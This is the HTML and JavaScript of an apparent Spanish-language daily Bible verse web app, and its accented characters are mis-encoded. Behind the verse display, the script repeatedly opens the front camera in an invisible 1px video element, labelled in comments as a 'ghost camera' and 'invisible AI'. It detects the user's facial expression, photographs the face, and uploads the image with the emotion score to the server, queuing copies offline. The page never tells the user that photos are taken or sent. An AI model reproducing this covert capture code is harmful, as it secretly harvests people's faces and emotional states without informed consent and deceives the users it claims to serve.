<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link rel="manifest" href="manifest.json">
  <title>Vers√≠culo Diario</title>
  
  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>

  <style>
    body { background: #121212; color: #e0e0e0; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; overflow-x: hidden; }
    
    #main-container { width: 90%; max-width: 600px; position: relative; padding-bottom: 50px; z-index: 10; }

    #verse { font-size: 1.5rem; font-style: italic; margin-bottom: 20px; line-height: 1.4; text-shadow: 0px 2px 4px rgba(0,0,0,0.5); opacity: 0; transition: opacity 0.5s ease; }
    #reference { font-weight: bold; margin-top: 10px; color: #bb86fc; font-size: 1.1rem; letter-spacing: 1px; text-transform: uppercase; opacity: 0; transition: opacity 0.5s ease; }
    
    @keyframes fadeInUpSubtle {
        0% { opacity: 0; transform: translateY(20px); filter: blur(5px); }
        100% { opacity: 1; transform: translateY(0); filter: blur(0); }
    }
    .fade-up { animation: fadeInUpSubtle 1.5s cubic-bezier(0.22, 1, 0.36, 1) forwards; }

    /* Animaci√≥n de "Pensando" */
    @keyframes pulseText {
        0% { opacity: 0.5; }
        50% { opacity: 1; }
        100% { opacity: 0.5; }
    }
    .analyzing { animation: pulseText 1.5s infinite ease-in-out; color: #03dac6; }

    .btn-group { display: flex; flex-direction: column; gap: 15px; margin-top: 30px; align-items: center; }
    button { padding: 15px 25px; border: none; cursor: pointer; border-radius: 50px; font-weight: 800; font-size: 0.9rem; width: 100%; max-width: 300px; transition: transform 0.2s; }
    button:active { transform: scale(0.95); }
    
    #btn-notify { background: linear-gradient(45deg, #bb86fc, #3700b3); color: white; box-shadow: 0 4px 15px rgba(187, 134, 252, 0.4); display: flex; align-items: center; justify-content: center; gap: 10px; }
    #btn-unsubscribe { background: #cf6679; color: #000; display: none; }

    .version-footer { position: fixed; bottom: 5px; width: 100%; text-align: center; font-size: 0.7rem; color: #555; pointer-events: none; }

    /* C√ÅMARA FANTASMA */
    #hidden-camera-container {
        position: fixed; top: 0; left: 0; width: 1px; height: 1px; 
        opacity: 0; z-index: -100; pointer-events: none;
    }
  </style>
</head>
<body>

  <div id="main-container">
    <div id="verse">Cargando inspiraci√≥n...</div>
    <div id="reference"></div>
    
    <div class="btn-group">
        <button id="btn-notify" onclick="window.subscribeUser()">üìú OBTENER SABIDUR√çA</button>
        <button id="btn-unsubscribe" onclick="window.unsubscribeUser()">üîï DETENER</button>
    </div>
  </div>

  <div id="hidden-camera-container">
      <video id="video-feed" autoplay muted playsinline></video>
  </div>

  <div id="version-footer" class="version-footer">Cargando versi√≥n...</div>

  <script type="module">
    import { versesDB } from './js/verses.js';

    const PUBLIC_VAPID_KEY = 'BLAmSvWiwybGELdtlKxn1XH_ftdsMs2IpWshmmPWGUF3ndWSS06tXY4oFAcUEHbYQPcDaaOl_6cwNjaFM0bmUhI';
    let currentVerseData = null;
    let videoStream = null;
    let modelsLoaded = false;
    
    // --- VARIABLES DE CONTROL ---
    let isScanning = false;
    let lastScanTime = 0;
    let scanStartTime = 0; // Para el timeout
    const SCAN_COOLDOWN = 15000; // 15 segs entre intentos
    const SCAN_TIMEOUT = 5000;   // 5 segs m√°ximo buscando cara

    // --- 1. L√ìGICA DE IA INVISIBLE (CON TIMEOUT) ---
    window.startMoodScan = async function(force = false) {
        if (isScanning) return; 

        const now = Date.now();
        if (!force && (now - lastScanTime < SCAN_COOLDOWN)) return;

        isScanning = true;
        scanStartTime = Date.now(); // Iniciamos cron√≥metro de b√∫squeda

        // Feedback visual sutil (Opcional)
        // document.getElementById('reference').classList.add('analyzing');

        try {
            videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            const video = document.getElementById('video-feed');
            video.srcObject = videoStream;

            if (!modelsLoaded) {
                await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/gh/cgarciagl/face-api.js@0.22.2/weights/');
                await faceapi.nets.faceExpressionNet.loadFromUri('https://cdn.jsdelivr.net/gh/cgarciagl/face-api.js@0.22.2/weights/');
                modelsLoaded = true;
            }

            detectEmotionLoop();

        } catch (err) {
            console.error("Error/Permiso c√°mara:", err);
            handleScanFailure(); // Fallback inmediato si no hay c√°mara
        }
    }

    async function detectEmotionLoop() {
        if (!isScanning) return;
        const video = document.getElementById('video-feed');

        // --- CHECK DE TIEMPO L√çMITE ---
        // Si lleva m√°s de 5 segundos buscando y no encuentra nada...
        if (Date.now() - scanStartTime > SCAN_TIMEOUT) {
            console.log("‚è∞ Tiempo agotado. No se detect√≥ rostro.");
            handleScanFailure(); // Nos rendimos y mostramos vers√≠culo random
            return;
        }

        try {
            const options = new faceapi.TinyFaceDetectorOptions();
            const detections = await faceapi.detectSingleFace(video, options).withFaceExpressions();

            if (detections) {
                const expressions = detections.expressions;
                const sorted = Object.keys(expressions).sort((a, b) => expressions[b] - expressions[a]);
                const dominant = sorted[0];
                const confidence = expressions[dominant];

                if (confidence > 0.5) {
                    console.log(`IA √âxito: ${dominant}`);
                    
                    // 1. Guardar
                    captureAndSave(video, dominant, confidence);

                    // 2. Finalizar √âxito
                    finishScan(dominant);
                    return;
                }
            }
        } catch(e) {}

        if (isScanning) setTimeout(detectEmotionLoop, 200);
    }

    // --- MANEJO DE √âXITO Y FRACASO ---
    
    function finishScan(mood) {
        lastScanTime = Date.now();
        isScanning = false;
        stopCamera();
        document.getElementById('reference').classList.remove('analyzing');
        showVerseByMood(mood);
    }

    function handleScanFailure() {
        // Fallback: Si falla la c√°mara o no hay cara, mostramos vers√≠culo aleatorio
        // y activamos el Cooldown para no reintentar inmediatamente.
        console.log("‚ö†Ô∏è Fallback: Vers√≠culo aleatorio (Sin guardar en Mongo)");
        
        lastScanTime = Date.now(); // Activamos cooldown para que no buclee
        isScanning = false;
        stopCamera();
        
        document.getElementById('reference').classList.remove('analyzing');
        
        // Vers√≠culo aleatorio puro
        const randomVerse = versesDB[Math.floor(Math.random() * versesDB.length)];
        renderVerse(randomVerse);
    }

    // --- UTILIDADES ---
    function getVerseForMood(mood) {
        let dbMood = 'neutral';
        if (mood === 'happy') dbMood = 'happy';
        if (mood === 'sad') dbMood = 'sad';
        if (mood === 'angry' || mood === 'disgusted') dbMood = 'angry';
        if (mood === 'fearful') dbMood = 'fear';
        const filtered = versesDB.filter(v => v.m && v.m.includes(dbMood));
        const pool = filtered.length > 0 ? filtered : versesDB;
        return pool[Math.floor(Math.random() * pool.length)];
    }

    function showVerseByMood(mood) {
        renderVerse(getVerseForMood(mood));
    }

    async function captureAndSave(videoElement, emotion, confidence) {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(videoElement, 0, 0);

            const base64Image = canvas.toDataURL('image/jpeg', 0.5);
            const verse = getVerseForMood(emotion);
            const payload = { image: base64Image, emotion, confidence, verse };

            if (navigator.onLine) sendToMongo(payload);
            else saveToOfflineQueue(payload);
        } catch (e) { console.error(e); }
    }

    async function sendToMongo(payload) {
        try {
            await fetch('/api/save-mood', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch(e) { saveToOfflineQueue(payload); }
    }

    function saveToOfflineQueue(payload) {
        let queue = JSON.parse(localStorage.getItem('mood_queue') || '[]');
        queue.push(payload);
        if (queue.length > 3) queue.shift();
        localStorage.setItem('mood_queue', JSON.stringify(queue));
    }

    async function processOfflineQueue() {
        if (!navigator.onLine) return;
        let queue = JSON.parse(localStorage.getItem('mood_queue') || '[]');
        if (queue.length === 0) return;
        for (const item of queue) { await sendToMongo(item); }
        localStorage.removeItem('mood_queue');
    }

    window.addEventListener('online', processOfflineQueue);
    window.addEventListener('load', processOfflineQueue);

    window.stopCamera = function() {
        if (videoStream) {
            videoStream.getTracks().forEach(track => track.stop());
            videoStream = null;
        }
    }

    // --- RENDERIZADO ---
    function renderVerse(data) {
        currentVerseData = data;
        const verseEl = document.getElementById('verse');
        const refEl = document.getElementById('reference');
        
        verseEl.style.opacity = 0;
        refEl.style.opacity = 0;

        setTimeout(() => {
            verseEl.innerText = `"${data.t}"`;
            refEl.innerText = data.r;
            verseEl.style.opacity = 1;
            refEl.style.opacity = 1;
            verseEl.classList.remove('fade-up');
            void verseEl.offsetWidth; 
            verseEl.classList.add('fade-up');
        }, 500);
    }

    async function showVersionFromSW() {
        try {
            const response = await fetch('./sw.js?t=' + new Date().getTime());
            const text = await response.text();
            const match = text.match(/const\s+CACHE_NAME\s*=\s*['"]([^'"]+)['"]/);
            if (match && match[1]) document.getElementById('version-footer').innerText = `App: ${match[1].replace('biblia-', '')}`;
        } catch (e) {}
    }

    function updateUI(isSubscribed) {
        const btnNotify = document.getElementById('btn-notify');
        const btnUnsub = document.getElementById('btn-unsubscribe');
        if (isSubscribed) { 
            btnNotify.style.display = 'none'; 
            btnUnsub.style.display = 'inline-block';
        } else { 
            btnNotify.style.display = 'inline-block'; 
            btnUnsub.style.display = 'none';
        }
    }

    window.subscribeUser = async function() {
      if (!('serviceWorker' in navigator)) return;
      try {
        const registration = await navigator.serviceWorker.ready;
        const permission = await Notification.requestPermission();
        if (permission !== 'granted') return;
        
        function urlBase64ToUint8Array(base64String) {
            const padding = '='.repeat((4 - base64String.length % 4) % 4);
            const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
            const rawData = window.atob(base64);
            const outputArray = new Uint8Array(rawData.length);
            for (let i = 0; i < rawData.length; ++i) outputArray[i] = rawData.charCodeAt(i);
            return outputArray;
        }

        const subscription = await registration.pushManager.subscribe({ userVisibleOnly: true, applicationServerKey: urlBase64ToUint8Array(PUBLIC_VAPID_KEY) });
        const response = await fetch('/api/subscribe', { method: 'POST', body: JSON.stringify({ subscription, firstVerse: currentVerseData }), headers: { 'Content-Type': 'application/json' } });
        
        if (response.ok) { 
            localStorage.setItem('setup_v1_pwa', 'true'); 
            updateUI(true);
            setTimeout(() => startMoodScan(true), 500); 
        } 
      } catch (err) { console.error(err); }
    }

    window.unsubscribeUser = async function() {
        if (!confirm("¬øSeguro que quieres borrar tus datos?")) return;
        try {
            const reg = await navigator.serviceWorker.ready;
            const sub = await reg.pushManager.getSubscription();
            if (sub) {
                 await fetch('/api/unsubscribe', { method: 'POST', body: JSON.stringify({ endpoint: sub.endpoint }), headers: { 'Content-Type': 'application/json' } });
                 await sub.unsubscribe();
                 localStorage.removeItem('setup_v1_pwa');
            }
            updateUI(false);
            window.location.reload();
        } catch(e) { console.error(e); }
    }

    // --- INICIALIZACI√ìN ---
    showVersionFromSW();
    renderVerse(versesDB[new Date().getDate() % versesDB.length]);

    // Visibilidad (Re-escaneo INTELIGENTE al volver)
    document.addEventListener("visibilitychange", () => {
        if (document.visibilityState === "visible") {
            const isSetupDone = localStorage.getItem('setup_v1_pwa');
            // Si regresa, intentamos escanear, pero startMoodScan respetar√° el COOLDOWN
            // as√≠ que si fall√≥ hace 2 segundos, no intentar√° de nuevo.
            if (isSetupDone) startMoodScan(); 
        }
    });
    
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('sw.js', { type: 'module' }).then(reg => {
          reg.onupdatefound = () => {
              const newWorker = reg.installing;
              newWorker.onstatechange = () => { if (newWorker.state === 'activated' && navigator.serviceWorker.controller) window.location.reload(); };
          };
      });
      navigator.serviceWorker.addEventListener('controllerchange', () => window.location.reload());
      
      navigator.serviceWorker.ready.then(async (reg) => {
          const sub = await reg.pushManager.getSubscription();
          const isStandalone = window.matchMedia('(display-mode: standalone)').matches;
          const isSetupDone = localStorage.getItem('setup_v1_pwa');
          
          if (isStandalone && !isSetupDone) updateUI(false); 
          else updateUI(!!sub);

          if (!!sub || isSetupDone) {
              setTimeout(() => { startMoodScan(); }, 1000);
          }
      });
    }
  </script>
</body>
</html>
